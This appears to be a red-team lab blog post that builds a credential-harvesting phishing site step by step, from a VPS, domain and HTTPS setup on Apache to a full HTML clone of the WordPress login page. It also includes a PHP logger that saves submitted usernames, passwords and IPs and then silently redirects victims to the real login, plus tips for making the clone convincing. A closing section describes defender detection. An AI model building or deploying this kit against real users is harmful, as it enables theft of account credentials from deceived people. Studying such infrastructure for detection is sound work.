---
title: "Honeypot WordPress Page: Credential Harvesting Lab"
date: "2025-11-02"
description: "Building a fake WordPress login page on a VPS with Apache, PHP credential logging, and ZeroSSL — understanding how credential harvesting infrastructure actually works."
tags: ["red-team", "phishing", "apache", "php", "lab", "honeypot"]
---

## What This Is

This lab documents how I built a credential harvesting honeypot — a fake WordPress login page running on a real VPS with a real domain, valid HTTPS, and a PHP backend that logs anything submitted to it.

The goal was to understand what this infrastructure actually looks like from the inside. How do you get a valid SSL cert? How does Apache serve a custom page? How does PHP capture form submissions? These are questions that matter whether you're building them offensively in a lab or detecting them defensively in the wild.

Everything here was done in a controlled lab environment on infrastructure I own.

---

## Lab Environment

| Component | What I Used |
|---|---|
| VPS | DigitalOcean |
| Domain | Purchased via Namecheap |
| DNS Management | Cloudflare |
| SSL Certificate | ZeroSSL (free) |
| Web Server | Apache2 |
| Backend | PHP |
| Email (optional) | Zoho |

---

## Architecture Overview

The flow is simple but the details matter:

```
Victim browser
     ↓
Domain (sinosomtechnology.qzz.io)
     ↓
Cloudflare DNS → routes to VPS IP
     ↓
Apache2 on VPS (port 443, HTTPS with ZeroSSL cert)
     ↓
index.html → fake WordPress login page
     ↓
capture.php → logs credentials to creds.txt
     ↓
Redirects victim to real WordPress login
```

The redirect at the end is the part most people miss. Sending someone to the real WordPress login after capturing their input means they assume they mistyped their password and just log in normally. Nothing looks wrong from their side.

---

## Step 1 — VPS and Domain Setup

Spun up a DigitalOcean droplet running Ubuntu.

![DigitalOcean VPS setup](/blog/honeypot/cloudocean.png)

Bought a domain and pointed it to the VPS.

![Domain registration](/blog/honeypot/domain.png)

---

## Step 2 — DNS in Cloudflare

Created an A record in Cloudflare pointing the domain to the VPS IP. This routes all domain traffic to the server.

![Cloudflare DNS records](/blog/honeypot/domainDNS.png)

One important note: Cloudflare proxy (the orange cloud) needs to be **off** — DNS only. When proxy is on, Cloudflare terminates the TLS connection itself, which conflicts with the certificate we're installing directly on Apache.

---

## Step 3 — Free SSL Certificate with ZeroSSL

ZeroSSL issues free 90-day certificates. After verifying domain ownership, you download three files:

- `your_domain.crt` — the certificate
- `your_domain.key` — the private key
- `ca_bundle.crt` — the certificate chain

Upload these to the VPS. I stored them under `/root/ssl/`.

---

## Step 4 — Installing Apache and PHP

```bash
sudo apt update
sudo apt install apache2 php libapache2-mod-php -y
```

Remove the default Apache page:

```bash
cd /var/www/html
sudo rm index.html
```

---

## Step 5 — Configuring Apache for HTTPS

Enable the SSL module and default SSL site:

```bash
sudo a2enmod ssl
sudo a2ensite default-ssl
```

Edit the SSL virtual host config:

```bash
sudo nano /etc/apache2/sites-available/default-ssl.conf
```

Point it to your ZeroSSL certificate files:

```apache
<IfModule mod_ssl.c>
    <VirtualHost _default_:443>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        SSLEngine on
        SSLCertificateFile    /root/ssl/certs/your_domain.crt
        SSLCertificateKeyFile /root/ssl/private/your_domain.key
        SSLCertificateChainFile /root/ssl/certs/ca_bundle.crt
    </VirtualHost>
</IfModule>
```

Test the config and restart:

```bash
sudo apache2ctl configtest
sudo systemctl restart apache2
```

If `configtest` returns `Syntax OK` you're good. Visit your domain — the padlock should appear. No "not secure" warning.

---

## Step 6 — The Fake WordPress Login Page

Replace `index.html` with a WordPress-styled login page. The visual design matters here — a convincing clone reduces suspicion.

```html
<!DOCTYPE html>
<html>
<head>
    <title>WordPress Login</title>
    <style>
        body { background: #f0f0f1; font-family: -apple-system, sans-serif; }
        .login { width: 320px; margin: 100px auto; }
        .login h1 a {
            background: url(https://wordpress.org/favicon.ico) no-repeat center;
            background-size: 84px;
            display: block; height: 84px; text-indent: -9999px;
        }
        form { background: #fff; padding: 26px; border-radius: 3px; }
        input[type=text], input[type=password] {
            width: 100%; padding: 8px; margin: 6px 0 16px;
            border: 1px solid #dcdcde; border-radius: 3px; box-sizing: border-box;
        }
        input[type=submit] {
            width: 100%; background: #2271b1; color: #fff;
            border: none; padding: 10px; border-radius: 3px; cursor: pointer;
        }
        input[type=submit]:hover { background: #135e96; }
    </style>
</head>
<body>
    <div class="login">
        <h1><a href="#">WordPress</a></h1>
        <form method="POST" action="capture.php">
            <label>Username or Email Address</label>
            <input type="text" name="username" placeholder="Username">
            <label>Password</label>
            <input type="password" name="password" placeholder="Password">
            <input type="submit" value="Log In">
        </form>
    </div>
</body>
</html>
```

![WordPress honeypot login page](/blog/honeypot/phishing-wordpress.png)

---

## Step 7 — The PHP Credential Logger

Create `capture.php` in `/var/www/html/`:

```php
<?php
$user = $_POST['username'];
$pass = $_POST['password'];
$ip   = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$log  = "[$time] IP: $ip | User: $user | Pass: $pass\n";
file_put_contents("creds.txt", $log, FILE_APPEND);
header("Location: https://wordpress.com/log-in");
exit();
?>
```

I added IP address and timestamp logging on top of the basic version — useful for analysis. The redirect sends the user to the real WordPress login. From their perspective they just mistyped their password.

Create the log file and set permissions so Apache can write to it:

```bash
sudo touch /var/www/html/creds.txt
sudo chown www-data:www-data /var/www/html/creds.txt
sudo chmod 666 /var/www/html/creds.txt
```

---

## Step 8 — Testing

Visit the domain. The WordPress login page loads over HTTPS with a valid padlock.

Submit test credentials. Check the log:

```bash
cat /var/www/html/creds.txt
```

Output:

```
[2025-11-02 11:34:22] IP: 192.168.1.5 | User: admin | Pass: password123
```

![Captured credentials in creds.txt](/blog/honeypot/victim-creds.png)

It works. The submission is logged, the user is redirected, and nothing on the page indicates anything went wrong.

---

## What a Defender Would See

**Network layer** — a domain with a fresh ZeroSSL cert, no history, mimicking WordPress. Certificate transparency monitoring catches this immediately. The cert is publicly logged the moment it's issued.

**Email delivery** — if used for phishing, the sending domain would fail SPF/DKIM unless properly configured. A mail gateway doing header inspection flags it.

**The PHP file** — `capture.php` and `creds.txt` sitting in the web root is an obvious indicator of compromise if the server is ever inspected. A proper blue team doing incident response finds these immediately.

**The redirect** — behavioral analytics on the identity provider side would flag a login from a new IP or device immediately after the credential submission, even if the victim successfully logs into the real site afterward.

---

## What I Took From This

The technical barrier to building this is low. Apache, PHP, a free SSL cert, and a free domain — that's the entire stack. What's hard is staying undetected, and that difficulty comes from the defender tooling that exists specifically to catch this pattern.

Certificate transparency logs, DNS history analysis, SPF/DKIM enforcement, and behavioral login analytics are all standard controls that make this type of infrastructure short-lived in a real environment. Building it in a lab makes you understand exactly why those controls exist and what they're looking for.

That understanding is the point.